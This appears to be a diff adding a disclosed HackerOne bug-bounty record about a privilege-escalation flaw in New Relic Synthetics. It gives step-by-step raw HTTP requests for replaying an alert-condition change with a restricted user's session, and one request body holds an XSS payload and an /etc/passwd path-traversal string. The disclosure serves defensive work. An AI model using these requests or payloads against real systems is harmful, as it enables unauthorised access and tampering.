@@ -1,0 +1,140 @@
+{
+  "id": 334143,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzQxNDM=",
+  "url": "https://hackerone.com/reports/334143",
+  "title": "[NR Synthetics] Restricted User can add/modify alert conditions on monitors without any synthetics privileges ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-04-06T04:22:26.951Z",
+  "submitted_at": "2018-04-06T04:22:26.951Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jon_bottarini",
+    "url": "/jon_bottarini",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-04T10:54:23.028Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-20T02:48:40.675Z",
+  "team_member_agreed_on_going_public_at": "2020-09-04T10:54:22.939Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There is a privilege escalation bug that allows a user with restricted privileges to make changes to alerts on Synthetics monitors, without the proper permissions to do so (in fact, they can make changes with NO synthetics permissions). In order to reproduce this it's easiest if you have two accounts (an admin user and the restricted user). \n\n## Steps to Reproduce:\n\n1. Login as an admin and navigate to Synthetics. Make sure that Synthetics privileges are turned ON and the Restricted User is not given any privileges. \n2. Create a new monitor \n3. Navigate to the alert settings for the monitor (https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions)\n4. Click on the \"Add alert condition\" button \n5. Choose any alert condition and turn intercept on in Burp Suite before you click \"Save\". \n\nThere will be a POST request that looks like this:\n\n```\nPOST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1\nHost: synthetics.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://synthetics.newrelic.com/accounts/1523936/monitors/99657e19-ace3-483d-a5d4-d199f09e177b/conditions\nContent-Type: application/json;charset=utf-8\nX-XSRF-TOKEN: 6Zp788coFKDDHdLNQiLvkWAeggcPki84R8PPyv88ywxnaHVMZg6oXPusDMg2kA6K\nContent-Length: 265\nCookie: admincookies\nConnection: close\n\n{\"id\":189244,\"accountId\":1523936,\"name\":\"\\\"><img src=x onerror=alert(1)>\",\"enabled\":true,\"isDefaultPolicy\":false,\"accountPolicyId\":110103,\"description\":\"'Check Failure' - /../../../../../../../../../../../../../../../etc/passwd%00 and 1 other notification channel\"}\n```\n\n**Do not** forward this request. Send this request to repeater, then DROP the request so that it does not complete. \n\n\n6. Now, from a restricted user account, login and navigate to Synthetics, the page should look like this:\n\n{F282466}\n\nNotice, no Synthetics permissions. \n\n7. From the Restricted account, reload the Synthetics page and make sure that your Burp intercept proxy is on. \n8. The request will be captured and look something like this:\n\n```\nGET /accounts/1523936/plan.json HTTP/1.1\nHost: synthetics.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://synthetics.newrelic.com/accounts/1523936/monitors\nX-XSRF-TOKEN: uNzCKU1fgpc0eczC5VfAsBWQ5DtsVSuZKkvS3U3M0HQ5BY4SHn8LBaSKg10CYQla\nCookie: restrictedcookies\nDNT: 1\nConnection: close\n```\n\nNow, change the request so that it looks like this:\n\n```\nPOST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1\nHost: synthetics.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nReferer: https://synthetics.newrelic.com/accounts/1523936/sla-report\nX-XSRF-TOKEN: uNzCKU1fgpc0eczC5VfAsBWQ5DtsVSuZKkvS3U3M0HQ5BY4SHn8LBaSKg10CYQla\nCookie: restrictedusercookies\nDNT: 1\nConnection: close\nContent-Length: 190\n\n{\"id\":181171,\"accountId\":1523936,\"name\":\"123987\",\"enabled\":true,\"isDefaultPolicy\":false,\"accountPolicyId\":102030,\"description\":\"'Check Failure' - ██████ notification channel\"}\n```\n\n**Notice:**\n\n- We are using the Restricted User's CSRF token\n- We are using the restricted users cookies to perform the request\n\nAll we have really changed here is that we've changed the `GET /accounts/1523936/monitors HTTP/1.1` request to `POST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1`, we added the `Content-Type: application/json;charset=utf-8` header, and we added the request itself:\n\n`{\"id\":181171,\"accountId\":1523936,\"name\":\"123987\",\"enabled\":true,\"isDefaultPolicy\":false,\"accountPolicyId\":102030,\"description\":\"'Check Failure' - ██████████ notification channel\"}`\n\nIf you get this response:\n\n`{\"code\":415,\"message\":\"HTTP 415 Unsupported Media Type\"}`\n\nIt means you forgot to include the `Content-Type: application/json;charset=utf-8` header in your request. \n\nA successful privilege escalation (if you've done the steps above correctly) will look like this: \n{F282468}\n\nGo back to the conditions from the Admin account, and you'll notice that the new alert condition has been added.\n\n## Impact\n\nPrivilege escalation  - restricted user to privileged user/admin within Synthetics",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 282466,
+      "file_name": "Screen_Shot_2018-04-05_at_8.20.21_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/282/466/8c96bcff2dab2b59685731e85908b27d86a8f6af/Screen_Shot_2018-04-05_at_8.20.21_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-04-05_at_8.20.21_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-04-05_at_8.20.21_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130156Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=543f5c4de1fe00827133a6f8c46cf5bf293ba4583cd77a5d76f236b89564cc62",
+      "file_size": 336819,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 282468,
+      "file_name": "Screen_Shot_2018-04-05_at_9.10.59_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/282/468/121fcf3e3a1106415334e43b4b0013d3c277ed7d/Screen_Shot_2018-04-05_at_9.10.59_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-04-05_at_9.10.59_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-04-05_at_9.10.59_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130156Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37f102c1e393b1c45aeb31aeb1d29f3df07155ed7f2f50de06e933678f16df19",
+      "file_size": 394297,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-19T02:48:40.744Z",
+  "allow_singular_disclosure_after": -107345596.19249246,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "wi11",
+    "ali",
+    "jgu",
+    "savitar0x01",
+    "pahadi",
+    "eveeez",
+    "f1ras",
+    "prateek_thakare",
+    "cryptographer",
+    "aps08",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4411,
+    "asset_type": "URL",
+    "asset_identifier": "synthetics.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
